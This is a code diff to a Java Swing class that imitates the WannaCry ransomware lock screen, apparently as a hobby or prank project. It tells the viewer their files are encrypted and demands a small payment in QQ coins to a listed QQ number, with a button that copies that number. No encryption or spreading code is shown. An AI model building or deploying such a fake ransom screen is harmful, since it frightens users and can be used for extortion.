@@ -1,11 +1,14 @@
 package com.demo.zy;
 
 import java.awt.Color;
-import java.awt.Dimension;
 import java.awt.Font;
 import java.awt.Insets;
+import java.awt.Toolkit;
+import java.awt.datatransfer.StringSelection;
+import java.awt.event.MouseAdapter;
 import java.awt.event.MouseEvent;
-import java.awt.event.MouseListener;
+import java.awt.event.WindowAdapter;
+import java.awt.event.WindowEvent;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 
@@ -15,6 +18,7 @@ import javax.swing.JButton;
 import javax.swing.JComboBox;
 import javax.swing.JFrame;
 import javax.swing.JLabel;
+import javax.swing.JOptionPane;
 import javax.swing.JPanel;
 import javax.swing.JRootPane;
 import javax.swing.JScrollPane;
@@ -34,40 +38,40 @@ class WannaCry extends JFrame {
 	/** CONFIG **/
 	private static final long serialVersionUID = 1L;
 	private static int WIDTH = 1000, HEIGHT = 710;
-	private static String NAME = "Wana  DecryptOr  2.0";
+	private int RANSOM = 1;
+	private static String NAME = "Wana  DecryptOr  2.1 plus";
 	private static String TITLE = "Ooops, your files have been encrypted!";
 	private static String TEXT = "我的电脑出了什么问题？\n" + "您的一些重要文件被我加密保存了。\n"
 			+ "照片、图片、文档、压缩包、音频、视频文件、exe文件等，几乎所有类型的文件都被加密了，因此不能正常打开。\n"
-			+ "这和一般文件损坏有本质上的区别。您大可在网上找找恢复文件的方法，我敢保证，没有我们的解密服务，就算老天爷来了也不能恢复这些文档。\n\n"
-			+ "有没有恢复这些文档的方法？\n"
+			+ "这和一般文件损坏有本质上的区别。您大可在网上找找恢复文件的方法，我敢保证，没有我们的解密服务，就算老天爷来了也不能恢复这些文档。\n\n" + "有没有恢复这些文档的方法？\n"
 			+ "我写不下去了，打字好他妈累。。。\n";
-	private static String PAY = "Send $300 worth of bitcoin to this address:";
-	private static String ADDRESS = "13AM4VM2dhxYgXeQepoHkHSQuy6NgaEb94";
+	private String PAY = "Send " + RANSOM + " yuan worth of QB to this QQ number:";
+	private static String ADDRESS = "1148871229";
 	private static String TOPIC_COLOR = "#8B2323";// 红
 	// private static String TOPIC_COLOR = "#228B22";//绿
 	private static String PATH_ICON = "/resource/icon.png";
 	private static String PATH_LOCK = "/resource/lock.png";
 	private static String PATH_COLOR = "/resource/color.png";
-	private static String PATH_BITCOIN = "/resource/bitcoin.png";
-	private static String LINK1 = "https://en.wikipedia.org/wiki/Bitcoin";
-	private static String LINK2 = "https://howtobuybitcoins.info/";
+	private static String PATH_QB = "/resource/qb.jpg";
+	private static String LINK1 = "http://baike.baidu.com/link?url=DqTnozzY3b5dBFctNXJXf2qUEANhu-TnWkQgIif94nMAB8BF2MK1aPifxafUomxTsf6x2pI17kv6Gc2UnNHmnMHqC9ke7FLnzW_Nb7kpXGecolCn9lZZ-6p_nvule86g";
+	private static String LINK2 = "https://pay.qq.com/ipay/index.shtml";
 	private static String[] LANGUAGE = { "Chinese (simple)", "English" };
 
 	/** COMPONENT **/
-	private ImageIcon imageIcon, imageIcon_lock, imageIcon_color, imageIcon_bitcoin;
+	private ImageIcon imageIcon, imageIcon_lock, imageIcon_color, imageIcon_qb;
 	private JFrame jFrame;
 	private JLabel jLabel_raise_text1, jLabel_raise_text2, jLabel_raise_text3, jLabel_raise_text4, jLabel_raise_color;
 	private JLabel jLabel_lost_text1, jLabel_lost_text2, jLabel_lost_text3, jLabel_lost_text4, jLabel_lost_color;
-	private JLabel jLabel_lock, jLabel_contact, jLabel_title, jLabel_bitcoin, jLabel_pay_text, jLabel_address;
+	private JLabel jLabel_lock, jLabel_contact, jLabel_title, jLabel_qb, jLabel_pay_text, jLabel_address;
 	private JPanel jPanel_raise, jPanel_lost, jPanel_pay, jPanel_address;
 	private LinkLabel linkLabel_1, linkLabel_2;
 	private JComboBox<String> jComboBox;
 	private JTextArea jTextArea_text;
-	private JScrollPane scrollPane;
+	private JScrollPane jScrollPane;
 	private JButton jButton_copy, jButton_check, jButton_decrypt;
 
 	private JFrame initJFrame() {
-		imageIcon = new ImageIcon(PATH_ICON);
+		imageIcon = new ImageIcon(getClass().getResource(PATH_ICON));
 		jFrame = new JFrame(NAME);
 		jFrame.setIconImage(imageIcon.getImage());
 		jFrame.setSize(WIDTH, HEIGHT);
@@ -78,6 +82,13 @@ class WannaCry extends JFrame {
 		jFrame.getRootPane().setWindowDecorationStyle(JRootPane.INFORMATION_DIALOG);
 		jFrame.getRootPane().setBackground(Color.getColor("#0000CD"));
 		jFrame.setLocationRelativeTo(null);
+		jFrame.addWindowListener(new WindowAdapter() {
+			@Override
+			public void windowClosing(WindowEvent e) {
+				super.windowClosing(e);
+				System.out.println("closing");
+			}
+		});
 		jFrame.setVisible(true);
 		return jFrame;
 	}
@@ -173,19 +184,19 @@ class WannaCry extends JFrame {
 		jPanel_lost.add(jLabel_lost_color);
 
 		/** HYPERLINK **/
-		linkLabel_1 = new LinkLabel("About bitcoin", LINK1);
+		linkLabel_1 = new LinkLabel("About QB", LINK1);
 		linkLabel_1.setBounds(30, 550, 100, 25);
 		linkLabel_1.setFont(new Font(Font.SANS_SERIF, 0, 15));
 		linkLabel_1.setForeground(Color.gray);
 		jPanel.add(linkLabel_1);
 
-		linkLabel_2 = new LinkLabel("How to buy bitcoins?", LINK2);
+		linkLabel_2 = new LinkLabel("How to buy QBs?", LINK2);
 		linkLabel_2.setBounds(30, 585, 160, 25);
 		linkLabel_2.setFont(new Font(Font.SANS_SERIF, 0, 15));
 		linkLabel_2.setForeground(Color.gray);
 		jPanel.add(linkLabel_2);
 
-		jLabel_contact = new JLabel("<html><u>" + "Contact Us");
+		jLabel_contact = new JLabel("<html><u>" + "Contact me");
 		jLabel_contact.setBounds(30, 620, 120, 40);
 		jLabel_contact.setFont(new Font(Font.SANS_SERIF, 0, 20));
 		jLabel_contact.setForeground(Color.decode("#96CDCD"));
@@ -215,12 +226,11 @@ class WannaCry extends JFrame {
 		jTextArea_text.setLineWrap(true);
 		jTextArea_text.setWrapStyleWord(true);
 
-		scrollPane = new JScrollPane(jTextArea_text);
-		scrollPane.setPreferredSize(new Dimension(700, 465));
-		scrollPane.setBounds(290, 50, 700, 465);
-		scrollPane.setLayout(new ScrollPaneLayout());
-		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
-		jPanel.add(scrollPane);
+		jScrollPane = new JScrollPane(jTextArea_text);
+		jScrollPane.setBounds(290, 50, 700, 465);
+		jScrollPane.setLayout(new ScrollPaneLayout());
+		jScrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
+		jPanel.add(jScrollPane);
 
 		/** PAY **/
 		jPanel_pay = new JPanel();
@@ -230,22 +240,22 @@ class WannaCry extends JFrame {
 		jPanel_pay.setLayout(null);
 		jPanel.add(jPanel_pay);
 
-		jLabel_bitcoin = new JLabel();
-		imageIcon_bitcoin = new ImageIcon(getClass().getResource(PATH_BITCOIN));
-		jLabel_bitcoin.setIcon(imageIcon_bitcoin);
-		// width = 168, height = 68
-		jLabel_bitcoin.setBounds(0, 11, imageIcon_bitcoin.getIconWidth(), imageIcon_bitcoin.getIconHeight());
-		jPanel_pay.add(jLabel_bitcoin);
+		jLabel_qb = new JLabel();
+		imageIcon_qb = new ImageIcon(getClass().getResource(PATH_QB));
+		jLabel_qb.setIcon(imageIcon_qb);
+		// width = 80, height = 80
+		jLabel_qb.setBounds(0, 5, imageIcon_qb.getIconWidth(), imageIcon_qb.getIconHeight());
+		jPanel_pay.add(jLabel_qb);
 
 		jLabel_pay_text = new JLabel(PAY);
-		jLabel_pay_text.setBounds(175, 7, 520, 25);
+		jLabel_pay_text.setBounds(105, 7, 590, 25);
 		jLabel_pay_text.setFont(new Font(Font.DIALOG, 1, 18));
 		jLabel_pay_text.setForeground(Color.ORANGE);
 		jPanel_pay.add(jLabel_pay_text);
 
 		jPanel_address = new JPanel();
 		jPanel_address.setBorder(BorderFactory.createMatteBorder(2, 2, 2, 2, Color.lightGray));
-		jPanel_address.setBounds(175, 45, 475, 35);
+		jPanel_address.setBounds(105, 45, 545, 35);
 		jPanel_address.setBackground(Color.decode(TOPIC_COLOR));
 		jPanel_address.setLayout(null);
 		jPanel_pay.add(jPanel_address);
@@ -280,33 +290,35 @@ class WannaCry extends JFrame {
 	}
 
 	private void setListener() {
-		jLabel_contact.addMouseListener(new MouseListener() {
-			@Override
-			public void mouseReleased(MouseEvent e) {
-			}
-
-			@Override
-			public void mousePressed(MouseEvent e) {
-			}
-
+		jLabel_contact.addMouseListener(new MouseAdapter() {
 			@Override
 			public void mouseExited(MouseEvent e) {
-				jLabel_contact.setText("<html><u>" + "Contact Us");
+				jLabel_contact.setText("<html><u>" + "Contact me");
 				jLabel_contact.setForeground(Color.decode("#96CDCD"));
 			}
 
 			@Override
 			public void mouseEntered(MouseEvent e) {
-				jLabel_contact.setText("<html><u>" + "Contact Us");
+				jLabel_contact.setText("<html><u>" + "Contact me");
 				jLabel_contact.setForeground(Color.decode("000000"));
-			}
-
-			@Override
-			public void mouseClicked(MouseEvent e) {
-				// TODO
 			}
 		});
 
+		jLabel_contact.addMouseListener(new MouseAdapter() {
+			@Override
+			public void mouseClicked(MouseEvent e) {
+				Message.getInstance();
+			}
+		});
+
+		jButton_copy.addMouseListener(new MouseAdapter() {
+			@Override
+			public void mouseClicked(MouseEvent e) {
+				Toolkit.getDefaultToolkit().getSystemClipboard().setContents(new StringSelection(ADDRESS), null);
+				JOptionPane.showMessageDialog(null, "Having pasted into your clipboard:\n" + ADDRESS, "Confirm",
+						JOptionPane.CLOSED_OPTION);
+			}
+		});
 	}
 
 	private void setAction() {
